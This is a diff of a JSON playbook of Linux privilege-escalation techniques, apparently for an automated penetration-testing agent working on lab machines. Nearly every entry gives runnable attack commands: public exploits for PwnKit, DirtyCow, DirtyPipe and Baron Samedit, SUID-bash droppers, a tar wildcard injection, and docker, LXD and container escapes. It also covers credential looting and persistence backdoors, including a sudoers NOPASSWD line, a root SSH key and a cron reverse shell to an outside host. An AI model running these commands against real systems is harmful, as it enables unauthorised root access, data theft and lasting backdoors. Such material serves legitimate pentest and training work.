+      "title": "polkit / pkexec Abuse (PwnKit, D-Bus)",
+      "phase": "escalate",
+      "os": [
+        "linux"
+      ],
+      "hypothesis": "polkit decides whether an unprivileged process may run a privileged action over D-Bus, and pkexec is its setuid helper. pkexec carried PwnKit (CVE-2021-4034), an instant local root on almost every Linux box for a decade, and policy misconfigurations or the CVE-2021-3560 race let you call privileged D-Bus actions you should not. The tell is simply that pkexec exists unpatched, or a D-Bus service exposes a loosely-policed action. Check the pkexec version first; it is often the fastest root on the box.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "gcc",
+        "busctl"
+      ],
+      "requires_any": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 54,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "root via a vulnerable pkexec or a permissively-policed D-Bus action",
+      "does_not_prove": "anything where pkexec is patched and no D-Bus action has a loose policy",
+      "report": {
+        "finding": "polkit/pkexec local privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "ls -l /usr/bin/pkexec && pkexec --version",
+          "note": "setuid pkexec before the 2022 fix is PwnKit-vulnerable (CVE-2021-4034)."
+        },
+        {
+          "tool": "gcc",
+          "run": "gcc {{exploit_src}} -o pwn && ./pwn",
+          "note": "A public CVE-2021-4034 PoC compiles on-box and drops a root shell; stage a precompiled binary if there is no compiler."
+        },
+        {
+          "tool": "busctl",
+          "run": "busctl list | grep -i accounts",
+          "note": "If pkexec is patched, look for a D-Bus action with a permissive policy (CVE-2021-3560 raced the accounts daemon)."
+        },
+        {
+          "tool": "sh",
+          "run": "id",
+          "note": "uid=0 confirms root; clean up any user you created."
+        }
+      ]
+    },
+    {
+      "id": "python-library-hijack",
+      "title": "Python Library / Import Path Hijack",
+      "phase": "escalate",
+      "os": [
+        "linux"
+      ],
+      "hypothesis": "When root runs a Python script and any directory on its module search path is writable by you, you plant a module the script imports and your code runs as root. Python searches the script directory first, then PYTHONPATH, then site-packages, so a writable script directory, a writable PYTHONPATH entry, or world-writable site-packages all give the hijack. The tell is a root cron or sudo-run Python script whose directory, or an importable path it uses, you can write.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "python3"
+      ],
+      "requires_any": [
+        "foothold.linux",
+        "access.shell",
+        "privesc.cron"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 50,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root where a privileged Python script imports a module from a path you can write",
+      "does_not_prove": "anything unless a writable path entry out-ranks the real module",
+      "report": {
+        "finding": "Python import-path hijack of a root-run script",
+        "severity": "high"
+      },
+      "refs": [
+        "https://docs.python.org/3/library/sys.html#sys.path"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "cat /etc/crontab; sudo -l 2>/dev/null | grep -i '\\.py'",
+          "note": "Find a root cron or sudo entry running a Python script: the imports you want to hijack."
+        },
+        {
+          "tool": "sh",
+          "run": "head -5 {{script_path}}",
+          "note": "A local (non-stdlib) import is the easiest to shadow; note its module name."
+        },
+        {
+          "tool": "sh",
+          "run": "ls -ld {{script_dir}} && python3 -c \"import sys;print(sys.path[0])\"",
+          "note": "The script's own directory is first on sys.path; a writable one lets you shadow any import."
+        },
+        {
+          "tool": "sh",
+          "run": "echo 'import os; os.system(\"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\")' > {{script_dir}}/{{module}}.py",
+          "note": "Plant a module with the imported name; it runs as root on the next execution. Then /tmp/rb -p."
+        }
+      ]
+    },
+    {
+      "id": "container-escape",
+      "title": "Container / Kubernetes Escape to Node",
+      "phase": "escalate",
+      "os": [
+        "linux"
+      ],
+      "hypothesis": "A container is not the objective; the node is. A --privileged (or CAP_SYS_ADMIN) container can mount the host disk or abuse cgroups to run on the host; a mounted Docker socket lets you start a container that bind-mounts the host root; and a Kubernetes service-account token with a permissive role lets you create a privileged pod or exec onto a node. The tell is a token under /var/run/secrets, a docker.sock in the mounts, or a capability set that should never be in a container.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "docker",
+        "kubectl"
+      ],
+      "requires_any": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 52,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "host (node) root from inside a container via privilege, a mounted socket, or a service-account token",
+      "does_not_prove": "anything where the container has no excess privilege, no mounted socket, and no usable token",
+      "report": {
+        "finding": "Container escape to host/node",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null",
+          "note": "A docker cgroup or /.dockerenv means you are containerized; the goal is escaping to the host."
+        },
+        {
+          "tool": "sh",
+          "run": "capsh --print | grep -i sys_admin; grep CapEff /proc/self/status",
+          "note": "A full CapEff mask or CAP_SYS_ADMIN is effectively privileged; mount the host disk or abuse cgroups."
+        },
+        {
+          "tool": "docker",
+          "run": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh",
+          "note": "A mounted docker.sock is root on the host by design; bind-mount / and chroot in."
+        },
+        {
+          "tool": "kubectl",
+          "run": "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i create pods",
+          "note": "A permissive service-account token lets you create a privileged pod that mounts the host filesystem."
+        }
+      ]
+    },
+    {
+      "id": "dirtycow",
+      "title": "DirtyCow Copy-on-Write Race (CVE-2016-5195)",
+      "hypothesis": "DirtyCow is a race condition in the Linux kernel copy-on-write handling, present on kernels below 4.8.3, that lets an unprivileged user write to files they should only be able to read. The common variants either overwrite /etc/passwd to add a root user or hijack a SUID binary, both reaching root. It is a post-foothold local escalation, and it can be unstable, so snapshot the box if you can. Check the kernel version, compile the staged exploit, and run it.",
+      "tool": "gcc",
+      "tools": [
+        "gcc",
+        "uname"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "escalate",
+      "requires_any": [
+        "foothold.linux",
+        "access.shell",
+        "host.kernel"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 36,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root via the copy-on-write race on a kernel below 4.8.3",
+      "does_not_prove": "anything on a patched kernel, and the race can crash the host",
+      "report": {
+        "finding": "DirtyCow kernel copy-on-write privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"
+      ],
+      "commands": [
+        {
+          "tool": "uname",
+          "run": "uname -r",
+          "note": "DirtyCow affects kernels below 4.8.3; confirm before risking an unstable exploit."
+        },
+        {
+          "tool": "gcc",
+          "run": "gcc -pthread dirtycow.c -o /tmp/dcow -lcrypt && /tmp/dcow",
+          "note": "Compile and run on the target; the /etc/passwd variant then lets you su to the new root user."
+        }
+      ]
+    },
+    {
+      "id": "dirtypipe",
+      "title": "DirtyPipe Pipe Page-Cache Write (CVE-2022-0847)",
+      "hypothesis": "DirtyPipe is a Linux kernel flaw on versions 5.8 through 5.16.11 that lets an unprivileged user write into the page cache of a file they can only read, including read-only and SUID binaries. Overwriting a SUID binary like su with a small payload gives an immediate root shell. It is a post-foothold local escalation and is more reliable than DirtyCow. Confirm the kernel, compile the staged exploit, and point it at a SUID binary.",
+      "tool": "gcc",
+      "tools": [
+        "gcc",
+        "uname"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "escalate",
+      "requires_any": [
+        "foothold.linux",
+        "access.shell",
+        "host.kernel"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 37,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root by overwriting a SUID binary on a kernel between 5.8 and 5.16.11",
+      "does_not_prove": "anything on a patched kernel outside that range",
+      "report": {
+        "finding": "DirtyPipe kernel page-cache privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"
+      ],
+      "commands": [
+        {
+          "tool": "uname",
+          "run": "uname -r",
+          "note": "DirtyPipe affects kernels 5.8 through 5.16.11; confirm the version first."
+        },
+        {
+          "tool": "gcc",
+          "run": "gcc dirtypipe.c -o /tmp/dp && /tmp/dp /usr/bin/su",
+          "note": "The exploit backs up and rewrites the SUID binary, then hands you a root shell; it restores the original after."
+        }
+      ]
+    },
+    {
+      "id": "baron-samedit",
+      "title": "Sudo Baron Samedit Heap Overflow (CVE-2021-3156)",
+      "hypothesis": "Baron Samedit is a heap overflow in sudo itself, present on sudo below 1.9.5p2, that any local user can trigger regardless of their sudo rights, because it is reached through sudoedit before any permission check. A public exploit auto-detects the memory offsets and spawns a root shell. It is a post-foothold escalation that works even when sudo -l shows you nothing. Confirm the version, then run the exploit.",
+      "tool": "sudoedit",
+      "tools": [
+        "sudoedit",
+        "python",
+        "git"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "escalate",
+      "requires_any": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 38,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root via the sudo heap overflow on sudo below 1.9.5p2, with no sudo rights needed",
+      "does_not_prove": "anything on a patched sudo at or above 1.9.5p2",
+      "report": {
+        "finding": "Sudo Baron Samedit heap overflow privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"
+      ],
+      "commands": [
+        {
+          "tool": "sudoedit",
+          "run": "sudo --version | head -1",
+          "note": "Vulnerable at sudo below 1.9.5p2; a quick sudoedit -s crash test also confirms it."
+        },
+        {
+          "tool": "git",
+          "run": "git clone https://github.com/worawit/CVE-2021-3156",
+          "note": "The worawit exploit auto-detects the right offsets for the target."
+        },
+        {
+          "tool": "python",
+          "run": "python3 CVE-2021-3156/exploit_nss.py",
+          "note": "Spawns a root shell; no sudo rights are required for your user."
+        }
+      ]
     }
-   ]
-  },
-  {
-   "id": "sudo-abuse",
-   "title": "sudo / GTFOBins Abuse",
-   "hypothesis": "Entries returned by sudo -l on ordinary binaries frequently mean immediate root: any tool with a sudo entry on GTFOBins (vim, find, awk, tar, less, python...) has a published shell-escape technique. A NOPASSWD entry just hands it to you.",
-   "tool": "sudo",
-   "tools": [
-    "sudo"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.sudo_rights"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.admin"
-   ],
-   "priority": 80,
-   "proves": "demonstrates administrative/root access",
-   "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
-   "report": {
-    "finding": "sudo Misconfiguration (GTFOBins)",
-    "severity": "critical"
-   },
-   "refs": [
-    "https://gtfobins.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "sudo -l",
-     "note": "Go through each line. Look up every listed binary on gtfobins.github.io."
-    },
-    {
-     "tool": "sh",
-     "run": "sudo {{binary}} -c \"!/bin/sh\"",
-     "note": "This is the general shape; the precise escape varies by binary — GTFOBins provides the exact command for each tool."
-    }
-   ]
-  },
-  {
-   "id": "writable-passwd",
-   "title": "Writable /etc/passwd",
-   "hypothesis": "When /etc/passwd is writable by everyone (it turns up in labs more often than expected), you can add a root-equivalent account using a hash you produce on your own machine. There is no exploit involved — the file itself defines the trust boundary, and here it is wide open.",
-   "tool": "openssl",
-   "tools": [
-    "openssl"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.passwd_writable"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.admin"
-   ],
-   "priority": 74,
-   "proves": "demonstrates administrative/root access",
-   "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
-   "report": {
-    "finding": "World-Writable /etc/passwd",
-    "severity": "critical"
-   },
-   "refs": [],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "ls -la /etc/passwd",
-     "note": "Verify the write permission first. -rw-rw-rw- is the green light."
-    },
-    {
-     "tool": "openssl",
-     "run": "openssl passwd {{password}}",
-     "note": "Produce the hash on your own machine first."
-    },
-    {
-     "tool": "sh",
-     "run": "echo 'r00t:HASH_FROM_OPENSSL:0:0:root:/root:/bin/bash' >> /etc/passwd",
-     "note": "Add the crafted account, then run: su r00t. Swap HASH_FROM_OPENSSL for the hash you generated."
-    }
-   ]
-  },
-  {
-   "id": "nfs-squash",
-   "title": "NFS no_root_squash",
-   "hypothesis": "An NFS share exported with no_root_squash honors remote root: mount it from your attacking host (or from a foothold), leave a SUID binary or a root-owned shell on it, and run that as root on the target.",
-   "tool": "showmount",
-   "tools": [
-    "showmount",
-    "mount"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.nfs_no_root_squash",
-    "port:2049"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.admin"
-   ],
-   "priority": 74,
-   "proves": "demonstrates administrative/root access",
-   "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
-   "report": {
-    "finding": "NFS no_root_squash Misconfiguration",
-    "severity": "high"
-   },
-   "refs": [],
-   "commands": [
-    {
-     "tool": "showmount",
-     "run": "showmount -e {{target}}",
-     "note": "Enumerate the exports; if you cannot read the options directly, check for no_root_squash in /etc/exports from the foothold."
-    },
-    {
-     "tool": "sh",
-     "run": "mount -t nfs {{target}}:/share /mnt/nfs && cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash",
-     "note": "Drop a SUID bash onto the share..."
-    },
-    {
-     "tool": "sh",
-     "run": "/share/bash -p",
-     "note": "...then execute it on the target using -p so it retains effective root."
-    }
-   ]
-  },
-  {
-   "id": "lxc-lxd-escape",
-   "title": "LXC/LXD Group Escape",
-   "hypothesis": "Being in the lxd group is root without a password: lxd lets you spin up a privileged container, bind the host filesystem inside it, and then read or write anything as root. It is among the most frequent intended privesc routes in HTB/0xdf machines. Once `id` reports lxd (or lxc), the box is effectively done — everything after is procedure.",
-   "tool": "lxc",
-   "tools": [
-    "lxc"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.lxd_group"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.admin"
-   ],
-   "priority": 74,
-   "proves": "demonstrates administrative/root access",
-   "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
-   "report": {
-    "finding": "LXD Group Membership Grants Root",
-    "severity": "critical"
-   },
-   "refs": [
-    "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "id",
-     "note": "Verify lxd or lxc group membership before doing anything else."
-    },
-    {
-     "tool": "lxc",
-     "run": "lxc image list",
-     "note": "Reuse an existing image if one is present. Otherwise build your own locally: clone lxc-alpine-builder, build alpine.tar.gz, move it over, then run `lxc image import alpine.tar.gz --alias alpine`."
-    },
-    {
-     "tool": "lxc",
-     "run": "lxc init alpine privesc -c security.privileged=true",
-     "note": "A privileged container means root inside the container is root on the host."
-    },
-    {
-     "tool": "lxc",
-     "run": "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
-     "note": "Bind the whole host filesystem into the container."
-    },
-    {
-     "tool": "lxc",
-     "run": "lxc start privesc && lxc exec privesc /bin/sh",
-     "note": "From inside the container, /mnt/root is the host filesystem accessible as root. Grab flags, create accounts, finished."
-    }
-   ]
-  },
-  {
-   "id": "docker-socket",
-   "title": "Docker Socket / docker Group Escape",
-   "hypothesis": "A writable /var/run/docker.sock (or being in the docker group) amounts to root on the host: launch a container with the host filesystem attached and chroot into it. It is the same idea as LXD with a different daemon.",
-   "tool": "docker",
-   "tools": [
-    "docker"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.docker_group"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.admin"
-   ],
-   "priority": 74,
-   "proves": "demonstrates administrative/root access",
-   "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
-   "report": {
-    "finding": "Docker Socket Access Grants Root",
-    "severity": "critical"
-   },
-   "refs": [],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "ls -la /var/run/docker.sock && id",
-     "note": "If the socket is writable by you, or you are in the docker group → it is over."
-    },
-    {
-     "tool": "docker",
-     "run": "docker images",
-     "note": "Choose any image already present so you avoid pulling over the network."
-    },
-    {
-     "tool": "docker",
-     "run": "docker run -v /:/mnt --rm -it {{image}} chroot /mnt sh",
-     "note": "The host filesystem lands at /mnt with root privileges. Replace with an image from the docker images listing."
-    }
-   ]
-  },
-  {
-   "id": "suid-gtfobins",
-   "title": "SUID Binary Abuse",
-   "hypothesis": "SUID binaries execute with their owner's identity (typically root). The stock ones (su, sudo, mount) are expected — what you want is the OUTLIER: a custom or out-of-place binary carrying the SUID bit. Check anything unusual against GTFOBins; there are plenty of boxes where find / -perm -4000 alone is the whole path to root.",
-   "tool": "sh",
-   "tools": [
-    "sh"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.suid_candidate"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.admin",
-    "privesc.leads"
-   ],
-   "priority": 78,
-   "proves": "demonstrates administrative/root access and surfaces candidate local privilege-escalation paths",
-   "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
-   "report": {
-    "finding": "Exploitable SUID Binary",
-    "severity": "critical"
-   },
-   "refs": [
-    "https://gtfobins.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "find / -perm -4000 -type f 2>/dev/null",
-     "note": "Enumerate every SUID binary. Measure against the default set — anything that is not standard is your lead."
-    },
-    {
-     "tool": "sh",
-     "run": "find / -perm -g=s -o -perm -u=s -type f 2>/dev/null | xargs ls -la",
-     "note": "SUID and SGID together with ownership shown. SGID on notable groups matters (adm → read /var/log, shadow → crack root)."
-    }
-   ]
-  },
-  {
-   "id": "pspy-monitor",
-   "title": "Process Monitoring (pspy)",
-   "hypothesis": "Cron entries and timers execute root commands you will not find in /etc/crontab. pspy observes process creation WITHOUT needing root and exposes them: scripts sitting in writable paths, commands that leak credentials through their arguments, backup jobs open to hijack. When static enumeration dries up, watching the machine in motion is the next step — 0xdf uses pspy all the time.",
-   "tool": "pspy",
-   "tools": [
-    "pspy"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "foothold.linux",
-    "privesc.leads"
-   ],
-   "produces": [
-    "privesc.process_lead",
-    "credential.candidate"
-   ],
-   "priority": 72,
-   "proves": "surfaces a process-monitoring privesc lead and candidate credentials",
-   "does_not_prove": "this is a local privesc lead only — it is not admin/root/SYSTEM access until that is demonstrated on its own",
-   "report": {
-    "finding": "Scheduled Task Credential/Script Exposure",
-    "severity": "high"
-   },
-   "refs": [
-    "https://github.com/DominicBreuker/pspy"
-   ],
-   "commands": [
-    {
-     "tool": "pspy",
-     "run": "./pspy64 -pf -i 1000",
-     "note": "Serve pspy from your machine (python3 -m http.server), wget it into /tmp or /dev/shm, chmod +x, then run it. -p reports processes, -f filesystem events, -i is the poll interval in ms."
-    },
-    {
-     "tool": "sh",
-     "run": "watch -n1 \"ps aux | grep root | grep -v \\[\"",
-     "note": "A budget substitute for pspy on brief jobs. Root processes flickering past indicate a scheduled task."
-    }
-   ]
-  },
-  {
-   "id": "cron-abuse",
-   "title": "Cron Job Abuse and Tar Wildcards",
-   "hypothesis": "Two variants: (1) a root cron job executes a script you can WRITE — modify it, wait for the run, become root. (2) A root job runs tar/rsync/chown using a WILDCARD inside a directory you control — you cannot alter the command, yet you can drop files whose NAMES smuggle in options (tartarsauce: --checkpoint-action=exec). Wildcard injection is the move that catches people off guard.",
-   "tool": "sh",
-   "tools": [
-    "sh"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.cron_writable",
-    "privesc.process_lead"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.admin"
-   ],
-   "priority": 74,
-   "proves": "demonstrates administrative/root access",
-   "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
-   "report": {
-    "finding": "Cron Job Abuse Leading to Root",
-    "severity": "critical"
-   },
-   "refs": [
-    "https://gtfobins.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers",
-     "note": "List the jobs. For every script ask: can you write to it? Is its directory writable? Does it rely on wildcards?"
-    },
-    {
-     "tool": "sh",
-     "run": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/writable-script.sh",
-     "note": "For a writable root-run script: tack on a SUID dropper, let the schedule fire, then run /tmp/rootbash -p."
-    },
-    {
-     "tool": "sh",
-     "run": "cd /writable/backup/dir && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh' && echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' > shell.sh",
-     "note": "Tar wildcard injection: filenames that double as options. When root's tar -cf ... * runs, your checkpoint fires. The same idea applies to rsync (--rsh) and chown (--reference)."
-    }
-   ]
-  },
-  {
-   "id": "capabilities",
-   "title": "Linux Capabilities Abuse",
-   "hypothesis": "Capabilities carve up root's privileges — and misplaced ones become privesc: cap_setuid on python/perl is an instant root shell, cap_dac_read_search lets you read any file (shadow), cap_sys_admin is close to root. getcap locates them; GTFOBins documents a capabilities section for every interpreter.",
-   "tool": "python3",
-   "tools": [
-    "python3"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "privesc.capability"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "access.admin",
-    "loot.files"
-   ],
-   "priority": 78,
-   "proves": "demonstrates administrative/root access and recovers files",
-   "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
-   "report": {
-    "finding": "Dangerous Linux Capability Assignment",
-    "severity": "high"
-   },
-   "refs": [
-    "https://gtfobins.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "getcap -r / 2>/dev/null",
-     "note": "Enumerate all file capabilities. Anything set on an interpreter (python, perl, ruby, php, openssl, tcpdump) is a lead."
-    },
-    {
-     "tool": "python3",
-     "run": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
-     "note": "cap_setuid on python yields a root shell. Perl equivalent: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
-    },
-    {
-     "tool": "sh",
-     "run": "tcpdump -ni any -w /tmp/cap.pcap &",
-     "note": "cap_net_raw on tcpdump lets you capture traffic from the foothold; credentials in plaintext protocols fall straight into your hands."
-    }
-   ]
-  },
-  {
-   "id": "linux-loot-hunt",
-   "title": "Loot Hunting (Linux)",
-   "hypothesis": "Ahead of the exotic techniques, go looking for loot: shell history, configs containing passwords, other users' readable home directories, backups under /opt and /var, mail spools. Credentials repeatedly turn up in history files and config files — and a .bash_history symlinked to /dev/null is itself a tell that the author stashed something somewhere else.",
-   "tool": "sh",
-   "tools": [
-    "sh"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "foothold.linux",
-    "privesc.leads"
-   ],
-   "produces": [
-    "credential.candidate",
-    "loot.files"
-   ],
-   "priority": 82,
-   "proves": "surfaces candidate credentials and recovers files",
-   "does_not_prove": "this is credential material only — it is not access until it successfully authenticates against a service",
-   "report": {
-    "finding": "Credentials in Plaintext on Filesystem",
-    "severity": "high"
-   },
-   "refs": [
-    "https://github.com/peass-ng/PEASS-ng"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "cat ~/.bash_history; ls -la /home/*/; cat /home/*/.bash_history 2>/dev/null",
-     "note": "History files: commands leak passwords supplied as arguments, along with paths and other hosts."
-    },
-    {
-     "tool": "sh",
-     "run": "grep -rniE 'passw|secret|token|api[_-]?key' /etc /opt /var/www /srv 2>/dev/null | grep -v Binary | head -50",
-     "note": "A config-grep sweep. /var/www configs carry DB credentials; /opt holds backup scripts with baked-in passwords."
-    },
-    {
-     "tool": "sh",
-     "run": "ls -la /var/mail/ /tmp /dev/shm /var/backups 2>/dev/null; find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.bak' 2>/dev/null | grep -v '^/proc'",
-     "note": "Mail spools (the beep pattern), temp directories, backups, key files, KeePass databases."
-    }
-   ]
-  },
-  {
-   "id": "linux-persistence",
-   "title": "Linux Persistence (Post-Root)",
-   "hypothesis": "Once you have root, leave a way back in that outlasts password resets and reboots — handy for extended labs and when an exam permits re-entry. The low-profile choices: your SSH key in root's authorized_keys, a sudoers line for a low-priv account you own, or a cron callback. (Record everything you place.)",
-   "tool": "sh",
-   "tools": [
-    "sh"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "access.admin"
-   ],
-   "produces": [
-    "persistence.linux"
-   ],
-   "priority": 50,
-   "proves": "sets up a Linux persistence foothold",
-   "does_not_prove": "this is persistence-setup context — document it and clean it up; it is not a new privilege level",
-   "report": {
-    "finding": "Persistence Mechanism Planted",
-    "severity": "informational"
-   },
-   "refs": [
-    "https://gtfobins.github.io/"
-   ],
-   "commands": [
-    {
-     "tool": "sh",
-     "run": "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA... your-public-key' >> /root/.ssh/authorized_keys",
-     "note": "A common pattern in the field (admirer, brainfuck, armageddon). Create the keypair on YOUR machine first: ssh-keygen -t ed25519."
-    },
-    {
-     "tool": "sh",
-     "run": "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
-     "note": "A sudoers backdoor for an account you already own — it endures through root password changes."
-    },
-    {
-     "tool": "sh",
-     "run": "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\"' >> /etc/crontab",
-     "note": "A cron callback. Louder; favor keys when SSH is reachable."
-    }
-   ]
-  }
- ]
+  ]
 }
